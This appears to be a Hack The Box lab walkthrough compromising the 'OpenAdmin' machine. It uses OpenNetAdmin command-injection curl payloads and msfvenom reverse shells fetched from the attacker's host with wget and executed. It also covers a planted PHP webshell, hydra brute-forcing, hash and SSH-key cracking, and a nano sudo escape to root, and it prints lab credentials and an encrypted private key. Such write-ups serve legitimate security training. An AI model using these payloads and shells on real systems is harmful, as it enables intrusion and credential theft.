# [OpenAdmin](https://app.hackthebox.eu/machines/222)

Start with `nmap`:

```bash
# find open TCP ports
sudo masscan -p1-65535 10.10.10.171 --rate=1000 -e tun0 > masscan.txt
tcpports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
# TCP deep scan
sudo nmap -sS -p $tcpports -oA tcp --open -Pn --script "default,safe,vuln" -sV 10.10.10.171 &
# TCP quick scan
sudo nmap -v -sS -sC -F --open -Pn -sV 10.10.10.171
# UDP quick scan
sudo nmap -v -sU -F --open -Pn 10.10.10.171
```

The TCP quick scan returns the following:

![nmap1](./openadmin/nmap1.png)

Start the following web scanner:

```bash
nikto -h http://10.10.10.171/ -C all --maxtime=120s --output=nikto.txt
```

![nikto1](./openadmin/nikto1.png)

Manually browse to the website `http://10.10.10.171/`:

![web1](./openadmin/web1.png)

Nothing novel here. Start a directory scanner looking for PHP files:

```bash
ulimit -n 8192 # prevent file access error during gobuster scanning
gobuster dir -t 50 -r -q -z -o gobuster.txt -x php \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u http://10.10.10.171/ &
```

This returns 2 interesting directories:

```
/music (Status: 200)
/artwork (Status: 200)
/sierra (Status: 200)
```

Looking at `/music` shows the following:

![web2](./openadmin/web2.png)

Looking at `/artwork` shows the following:

![web3](./openadmin/web3.png)

Looking at `/sierra` shows the following:

![web4](./openadmin/web4.png)

All of these look like epty templates. Clicking around the pages does not show much. However, clicking on the `Login` button for `/music` brings a new page up:

![web5](./openadmin/web5.png)

Clicking on `Menu` and `About`brings up the following:

![web6](./openadmin/web6.png)

Look for an exploit:

```
searchsploit opennetadmin
```

![web7](./openadmin/web7.png)

Nice! These look promising:

- https://www.exploit-db.com/exploits/47772
- https://www.exploit-db.com/exploits/47691

Both are for a basic POST request that does command injection. Test this:

```bash
curl -s --data "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo 'BUBBA IS HERE'&xajaxargs[]=ping" http://10.10.10.171/ona/login.php 
```

Running this results in the following HTML from the target:

![test1](./openadmin/test1.png)

Since `BUBBA IS HERE` is returned, that is code execution! Use this to get a shell on the target

- Check first if `wget` is installed on the target using a `which wget` payload

```bash
# generate payload 
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=10.10.14.27 \
         LPORT=6969 \
         -f elf \
         -o bubba.elf
# host payload
sudo python3 -m http.server 80
# setup listener
nc -nvlp 6969
# trigger payload execution
P='wget -O /tmp/bubba.elf http://10.10.14.27/bubba.elf && chmod 777 /tmp/bubba.elf && /tmp/bubba.elf'
P_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$P'))")
curl -s --data "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;$P_ENC&xajaxargs[]=ping" http://10.10.10.171/ona/login.php 
```

But this does not return a reverse shell? The download works but not the reverse shell... Set up a basic "shell" to do some target enumeration:

```bash
while true;
do
  echo -n "$ "; read cmd
  ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$cmd'))")
  curl -s --data "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo 'BUBBA-START';$ENC;echo 'BUBBA-END'&xajaxargs[]=ping" http://10.10.10.171/ona/login.php | sed -n -e '/BUBBA-START/,/BUBBA-END/p' | tail -n +2 | head -n -1
done
```

![user1](./openadmin/user1.png)

From here, trying to run the exploit manually and redirecting STDERR to STDOUT shows the following error:

```
Bad system call (core dumped)
```

This is likely because the payload is x86 and not x64 for the target version. Re-generate the payload and get a reverse shell:

```bash
# generate payload 
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=10.10.14.27 \
         LPORT=6969 \
         -f elf \
         -o bubba.elf
# host payload
sudo python3 -m http.server 80
# setup listener
nc -nvlp 6969
# trigger payload execution
P='wget -O /tmp/bubba.elf http://10.10.14.27/bubba.elf && chmod 777 /tmp/bubba.elf && /tmp/bubba.elf'
P_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$P'))")
curl -s --data "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;$P_ENC&xajaxargs[]=ping" http://10.10.10.171/ona/login.php 
```

This returns a shell but not `user.txt`. The next step is to move laterally or escalate:

![user2](./openadmin/user2.png)

Looking around shows that there are some "internal" files owned by the coveted users on the system:

![user3](./openadmin/user3.png)

This becomes even more interesting when noticing an local or "internal" port open on the machine that is non-standard:

![user4](./openadmin/user4.png)

Maybe the 2 are linked? Look for the server configuration files for Apache2:

![user5](./openadmin/user5.png)

`/etc/apache2/sites-available/internal.conf` has the following content:

```
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Hmmm... So the `/var/www/internal` website is being served at `127.0.0.1:52846`. Start a remote port foward to connect to this website from Kali:

- **NOTE:** connecting to Kali on port 22 did not work (likely a target firewall rule?). However, moving SSH to a higher port worked.

```bash
# on kali, change SSH server to run on a higher port
# Port 22
# Port 9999 <--- add this line
sudo vim /etc/ssh/sshd_config
sudo systemctl restart sshd
# on target, connect to Kali SSH server
ssh -f -N -p 9999 -R 127.0.0.1:11111:127.0.0.1:52846 user@10.10.14.27
# on kali, browse to website
firefox http;//127.0.0.1:11111
```

![web8](./openadmin/web8.png)

Now this looks custom. Trying basic logins does not work... Try a bruteforce. Here is the relevant HTML after a failed login:

```html
<form class = "form-signin" role = "form" action = "/index.php" method = "post">
   <h4 class="form-signin-heading">Wrong username or password.</h4>
   <input type = "text" class = "form-control" name = "username" required autofocus></br>
   <input type = "password" class = "form-control" name = "password" required>
   <button class = "btn btn-lg btn-primary btn-block" type = "submit" name = "login">Login</button>
</form>
```

Convert this into the following brute-force attempt:

```bash
# copy over wordlist
cp /usr/share/wordlists/rockyou.txt.gz .
gunzip rockyou.txt.gz
# attempt to brute-force
hydra 127.0.0.1 http-form-post "/index.php:login=&username=^USER^&password=^PASS^:Login Restricted" -s 11111 -l admin -P rockyou.txt -vV -f
```

While that runs, start another directory scanner looking for PHP files since the main page is `index.php`:

```bash
ulimit -n 8192 # prevent file access error during gobuster scanning
gobuster dir -t 50 -r -q -z -o gobuster.internal.txt -x php \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u http://127.0.0.1:11111/ &
```

However, these do not produce any easy wins... Looking back at the configuration for the OpenAdmin site, there seems to be an interesting file at `/opt/ona/www/local/config`:

![user6](./openadmin/user6.png)

Here are the contents of `database_settings.inc.php`:

```php
<?php
$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```

The user info `ona_sys/n1nj4W4rri0R!` is quite unique. Try connecting to the database and see if there are any other credentials:

```bash
mysql -uona_sys -pn1nj4W4rri0R! -h localhost
```

Then run the following MySQL queries to extract the data from the database. Each query builds on the results from the previous query with the goal of finding user credentials:

```mysql
# get a list of all databases
SELECT schema_name FROM information_schema.schemata;
# the ona_default database is interesting, get all tables in it
SELECT table_name FROM information_schema.tables WHERE table_schema = 'ona_default';
# the users table is interesting, get all column names in it
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
# the username and password coluns should have the info needed, request it
SELECT username,password FROM ona_default.users;
```

![user7](./openadmin/user7.png)

Take the above hashes and crack them:

- Hashes definitely look like MD5

```bash
echo '098f6bcd4621d373cade4e832627b4f6'  > ona.hash
echo '21232f297a57a5a743894a0e4a801fc3' >> ona.hash
hashcat -m 0 -a 0 --quiet --potfile-disable ona.hash rockyou.txt
```

And this has some wins, but none that are unique enough to be the password for the internal web portal:

![hash1](./openadmin/hash1.png)

Try the `n1nj4W4rri0R!` password over SSH for the other accounts on the system:

```bash
ssh jimmy@10.10.10.171
ssh joanna@10.10.10.171
```

And the `jimmy` has a match!

![user8](./openadmin/user8.png)

But still no `user.txt` (UGH)! Since `jimmy` is in the `internal` group, go see the source code for the internal website at `/var/www/internal`. 

![user9](./openadmin/user9.png)

The contents of `index.php` has the following interesting section:

```php
<?php
   $msg = '';
   if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
     if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
         $_SESSION['username'] = 'jimmy';
         header("Location: /main.php");
     } else {
         $msg = 'Wrong username or password.';
     }
   }
?>
```

Then the contents of `main.php` are the following:

```php+HTML
<?php 
  session_start(); 
  if (!isset ($_SESSION['username'])) { 
    header("Location: /index.php"); 
  };
  # Open Admin Trusted
  # OpenAdmin
  $output = shell_exec('cat /home/joanna/.ssh/id_rsa');
  echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

So it seems that the first response would be to try and crack the SHA512 password hash, but since the owner of the directory is `jimmy`, just add a new webshell in the directory:

```bash
# on target, drop webshell as jimmy
echo '<?php echo shell_exec($_REQUEST["c"]); ?>' > /var/www/internal/bubba.php
# from kali, test webshell through SSH port foward
curl -s -G --data-urlencode 'c=id' http://127.0.0.01:11111/bubba.php
```

And this returns access to another user:

![user10](./openadmin/user10.png)

Use this new account to get a reverse shell:

```bash
# generate payload 
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=10.10.14.27 \
         LPORT=7777 \
         -f elf \
         -o bubba.joanna.elf
# host payload
sudo python3 -m http.server 80
# setup listener
nc -nvlp 7777
# trigger payload through webshell
curl -s -G --data-urlencode 'c=wget -O /tmp/bubba.joanna.elf http://10.10.14.27/bubba.joanna.elf && chmod 777 /tmp/bubba.joanna.elf && /tmp/bubba.joanna.elf' http://127.0.0.1:11111/bubba.php
```

![user11](./openadmin/user11.png)

And this finally gets `user.txt`. Inside of `/home/joanna/.ssh/` are some SSH keys:

![user12](./openadmin/user12.png)

The contents of `id_rsa` are as follows:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

This is an encrypted private key. It also seems like the public key in `id_rsa.pub` is also in `authorized_keys`. This means that cracking this SSH password for the key will allow for logging in over SSH without needing to know the password for the `joanna` account. Try cracking the password for the SSH private key:

- SSH key hash ID: https://hashcat.net/wiki/doku.php?id=example_hashes

```bash
# above SSH private key saved in key.priv
find / -iname ssh2john.py 2>/dev/null
/usr/share/john/ssh2john.py key.priv | cut -d ':' -f 2 > ssh.hash
hashcat -m 22931 -a 0 --quiet --potfile-disable ssh.hash rockyou.txt
```

But this results in the following error:

```
/usr/share/hashcat/modules/module_22931.so: cannot open shared object file: No such file or directory
```

This is because the 22931 hashcat module is not yet included in Kali. Download and compile the hashcat source and re-run the crack:

```bash
git clone https://github.com/hashcat/hashcat.git
cd hashcat
make
./hashcat -m 22931 -a 0 --quiet --potfile-disable ../ssh.hash ../rockyou.txt
```

This results in a win:

![hash2](./openadmin/hash2.png)

Use this to authenticate with the target at `joanna` without a password:

```bash
# prep directory for SSH keys
mkdir ./ssh-target
chmod 700 ./ssh-target
cp key.priv ./ssh-target/private.key
chmod 600 ./ssh-target/private.key
# attempt SSH connection
ssh -i ./ssh-target/private.key joanna@10.10.10.171 # password bloodninjas
```

And this results in a valid login:

![user13](./openadmin/user13.png)

And it seems like this user has Sudo privileges:

![user14](./openadmin/user14.png)

`nano` is a known GTFO bin:

- https://gtfobins.github.io/gtfobins/nano/

Use it to get a shell as `root`:

```bash
sudo /bin/nano /opt/priv
<ctrl>R<ctrl>X
reset; sh 1>&0 2>&0
```

![root1](./openadmin/root1.png)

